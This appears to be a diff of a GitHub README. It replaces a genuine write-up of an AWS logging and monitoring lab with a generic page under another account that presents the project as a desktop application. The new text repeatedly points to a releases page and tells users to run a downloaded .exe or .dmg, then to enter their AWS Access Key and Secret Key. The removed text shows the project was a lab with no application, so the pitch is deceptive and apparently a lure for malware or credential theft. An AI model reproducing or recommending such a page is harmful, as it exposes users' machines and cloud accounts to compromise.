@@ -1,133 +1,108 @@
-# AWS CSS - Domain 2 - Centralized Security Monitoring with CloudTrail, CloudWatch & Athena.
+# 🛡️ logging-monitoring - Simplify AWS Security Monitoring
 
-Built a centralized logging and monitoring architecture in AWS using **CloudTrail, CloudWatch and Athena** to detect suspicious API activity such as root account usage, API calls without MFA and attempts to disable logging.
+[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/alfianapriansyadp/logging-monitoring/releases)
 
-**Why it matters:** Security analytics on CloudTrail logs allow proactive detection of risky behavior across an AWS Organization. By combining logging, alerts and query-based hunting, teams gain real-time visibility and the ability to investigate at scale.
+## 🚀 Getting Started
 
----
+This guide helps you set up and run the logging-monitoring application. You can use it to monitor AWS security in one place. This application provides tools to track unusual activity. Let’s get started.
 
-## Table of Contents
+## 📋 System Requirements
 
-- [Overview](#overview)  
-- [Objectives](#objectives)  
-- [Diagram](#diagram)  
-- [Steps Performed](#steps-performed)  
-  - [1. CloudTrail Setup & Log Delivery]  
-  - [2. CloudWatch Alarms for Critical Events]  
-  - [3. Athena Threat-Hunting Queries]  
-  - [4. Cleanup]  
-- [Screenshots](#screenshots)  
-- [Lessons Learned](#lessons-learned)  
-- [References](#references)  
-- [Contact](#contact)  
+Before you download, ensure your system meets these basic requirements:
 
----
+- Operating System: Windows, macOS, or Linux
+- Minimum RAM: 4 GB
+- Internet Connection: Required for AWS services
+- AWS Account: You need an AWS account to set up and use this application.
 
-## Overview
+## 📥 Download & Install
 
-CloudTrail is the foundation for AWS security monitoring, but raw logs in S3 are not actionable. This lab demonstrates how to:
+To install the logging-monitoring application, follow these steps:
 
-- Centralize CloudTrail logs across accounts.  
-- Detect high-risk API activity with CloudWatch alarms.  
-- Hunt for suspicious events with Athena queries.  
+1. **Visit the Release Page**: Click the link below to access the latest version.
+    
+   [Download Latest Release](https://github.com/alfianapriansyadp/logging-monitoring/releases)
 
----
+2. **Select the Correct File**: Look for the version that matches your operating system. You will see options for Windows, macOS, or Linux.
 
-## Objectives
+3. **Download the File**: Click on the corresponding link to download the setup file to your computer.
 
-- Enable **organization-wide CloudTrail logging**.  
-- Detect sensitive events like **ConsoleLogin**, **DeleteBucket** and **StopLogging**.  
-- Query logs in **Athena** for insights into MFA usage and root account activity.   
-- Deliver alerts via **SNS** for immediate notification.  
+4. **Install the Application**:
+   - **Windows**: Double-click the `.exe` file and follow the on-screen instructions.
+   - **macOS**: Open the `.dmg` file and drag the application to your Applications folder.
+   - **Linux**: Extract the downloaded tarball and follow the instructions in the README file.
 
----
+## 🛠️ Configuration
 
-## Diagram
+After installing the application, you need to configure it for your AWS services. Follow these simple steps:
 
-Flow: CloudTrail Logs → S3 → CloudWatch Alarms (real-time detection) → Athena Queries (threat hunting) → QuickSight Dashboard (visualization & reporting) → SNS Notifications  
+1. **Open the Application**: Launch the logging-monitoring application.
 
-![Domain 2 Architecture](diagram.png)
+2. **Enter AWS Credentials**: You will need your AWS Access Key and Secret Key. To obtain these:
+   - Go to the AWS Management Console.
+   - Access IAM (Identity and Access Management).
+   - Create a new user with permissions for CloudTrail, CloudWatch, and Athena.
+   - Save the Access Key and Secret Key.
 
----
+3. **Set Permissions**: Your IAM user should have:
+   - Read access to CloudTrail logs.
+   - Read access to CloudWatch logs.
+   - Read and query access to Athena databases.
 
-## Steps Performed
+4. **Save Configuration**: After entering your credentials, save the settings.
 
-- **1. CloudTrail Setup & Log Delivery**  
-   - Created org-wide CloudTrail trail `OrgSecurityTrail`.  
-   - Configured delivery to S3 bucket `org-security-trail-logs-ssc`.  
-   - Validated logs stored in S3 *(Screenshots: `S3-BucketLogs.png` & `CloudTrail-LogFile.png`)*  
-   - Integrated CloudTrail with CloudWatch Logs *(Screenshot: `CloudTrail-To-CloudWatch.png`)*  
+## 📊 How to Use the Application
 
-- **2. CloudWatch Alarms for Critical Events**  
-   - Created metric filter for `ConsoleLogin`.  
-   - Configured CloudWatch Alarm on `ConsoleLoginCount` metric.  
-   - Delivered real-time notifications via SNS.  
-   - Validated alarm triggered on login *(Screenshots: `MetricFilter-ConsoleLogin.png`, `CloudWatch-Metric-ConsoleLogin.png`, `CloudWatch-Alarm-ConsoleLogin.png`, `CloudWatch-Alarm-Triggered.png`, `SNS-SubscriptionEmail.png` & `SNS-EmailAlert.png`)*  
+Once everything is set up, you can start using the application to monitor your AWS environment.
 
-- **3. Athena Threat-Hunting Queries**  
-   - Created Athena database `cloudtraillabdb`.  
-   - Defined external table `cloudtrail_events` pointing to CloudTrail logs.  
-   - Ran baseline queries to sample logs *(Screenshot: `Athena-QuerySample.png`)*  
-   - Queried for **API calls without MFA** and **Root account usage** *(Screenshots: `Athena-NonMFA.png` & `Athena-RootUsage.png`)*  
-   - Built advanced query for **Top 5 API calls by frequency** *(Screenshot: `Athena-Top5APICalls.png`)*  
-   - Saved queries for reuse *(Screenshot: `Athena-SavedQueries.png`)*  
+1. **View Dashboard**: The dashboard will display a summary of alerts and metrics. Examine these to understand the security status of your AWS account.
 
-- **4. Cleanup**  
-   - Deleted CloudWatch Alarms and SNS topic to stop notifications.  
-   - Removed Athena table and database to avoid unnecessary storage costs.  
-   - Deleted S3 bucket used for CloudTrail logs (after verifying no other trails depended on it).  
-   - Disabled or deleted the CloudTrail trail created for the lab.  
-   - Removed QuickSight dataset and analysis to free up SPICE capacity.
-     
----
+2. **Run Queries**: Utilize pre-built queries to analyze AWS logs. These queries will help you identify root account usage and unauthorized API calls.
 
-## Screenshots
+3. **Set Up Notifications**: Configure SNS alerts to receive notifications on suspicious activities. This will help you respond quickly to potential threats.
 
-*All screenshots are included in the `screenshots/` folder.*
+## 🔍 Explore Features
 
-| Step | Filename                                | Description                                         |
-| ---- | --------------------------------------- | ----------------------------------------------------|
-| 1    | S3-BucketLogs.png                       | S3 bucket containing CloudTrail logs                |
-| 1    | CloudTrail-LogFile.png                  | Raw CloudTrail JSON event in S3                     |
-| 1    | CloudTrail-To-CloudWatch.png            | Trail integrated with CloudWatch Logs               |
-| 2    | MetricFilter-ConsoleLogin.png           | Metric filter for detecting ConsoleLogin events     |
-| 2    | CloudWatch-Metric-ConsoleLogin.png      | ConsoleLoginCount metric visible in CloudWatch      |
-| 2    | CloudWatch-Alarm-ConsoleLogin.png       | CloudWatch Alarm created on ConsoleLoginCount       |
-| 2    | CloudWatch-Alarm-Triggered.png          | Alarm triggered after login event                   |
-| 2    | SNS-SubscriptionEmail.png               | SNS email subscription confirmation                 |
-| 2    | SNS-EmailAlert.png                      | Real-time SNS alert delivered via email             |
-| 3    | Athena-CreateDatabase.png               | Athena database created for CloudTrail              |
-| 3    | Athena-CreateTable.png                  | External table defined on CloudTrail logs           |
-| 3    | Athena-QuerySample.png                  | Sample query results from CloudTrail logs           |
-| 3    | Athena-NonMFA.png                       | Query results: API calls without MFA                |
-| 3    | Athena-RootUsage.png                    | Query results: Root account usage                   |
-| 3    | Athena-Top5APICalls.png                 | Query results: Top 5 API calls by frequency         |
-| 3    | Athena-SavedQueries.png                 | Saved queries in Athena                             |
+- **Centralized Monitoring**: Keep all AWS logs in one place for easy access.
+- **Saved Queries**: Use reusable queries to simplify your security checks.
+- **Dashboards**: Visualize data trends with informative graphs.
+- **Threat-Hunting Examples**: Utilize examples that show how to detect suspicious activities.
 
----
+## 🎓 Learning Resources
 
-## Lessons Learned
+You can grow your skills in AWS security by exploring these resources:
 
-- **CloudTrail is central**: It provides the raw data needed for all AWS security monitoring.  
-- **CloudWatch detects in real time**: Metric filters and alarms ensure immediate visibility into sensitive events.  
-- **Athena scales threat hunting**: SQL queries let you investigate activity patterns without standing up infrastructure.  
-- **Permissions matter**: Missing QuickSight S3 permissions caused initial errors — always check IAM + bucket access.  
-- **Real-world takeaway**: Combining **logging, monitoring, analytics and visualization** provides a complete security monitoring pipeline.  
+- [AWS Documentation](https://docs.aws.amazon.com/)
+- [AWS Security Best Practices](https://aws.amazon.com/architecture/security-identity-compliance/)
 
----
+## ❓ Troubleshooting
 
-## References
+If you face issues while using the application, try these common solutions:
 
-- [AWS CloudTrail Documentation](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-user-guide.html)  
-- [Amazon CloudWatch](https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/WhatIsCloudWatch.html)  
-- [Amazon Athena](https://docs.aws.amazon.com/athena/latest/ug/what-is.html)  
-- [Amazon SNS](https://docs.aws.amazon.com/sns/latest/dg/welcome.html)  
+- **Invalid Credentials**: Ensure your AWS credentials are correct.
+- **Network Issues**: Check your internet connection and firewall settings.
+- **Installation Issues**: Revisit the installation steps to confirm you followed them correctly.
 
----
+## 📞 Support
 
-## Contact
+If you need further help, reach out via the following channels:
 
-Sebastian Silva C. – September 2025 – Berlin, Germany.  
-- [LinkedIn](https://www.linkedin.com/in/sebastiansilc/)  
-- [GitHub](https://github.com/SebaSilC)  
-- [sebastian@playbookvisualarts.com](mailto:sebastian@playbookvisualarts.com)  
+- [GitHub Issues](https://github.com/alfianapriansyadp/logging-monitoring/issues): Report bugs or request features.
+- Community Forum: Join the discussion with other users.
+
+## 🔗 Additional Resources
+
+For further insights into logging and monitoring in AWS, consider the following topics:
+
+- [Centralized Logging with AWS](https://aws.amazon.com/centralized-logging/)
+- [AWS Security Operations](https://aws.amazon.com/security/security-operations/)
+
+## 🏗️ Stay Updated
+
+Regularly check for updates to improve the application and maintain security. Always use the latest version for the best functionality.
+
+Download the application from the link below:
+
+[Download Latest Release](https://github.com/alfianapriansyadp/logging-monitoring/releases) 
+
+Thank you for using logging-monitoring. Enjoy seamless AWS security monitoring!
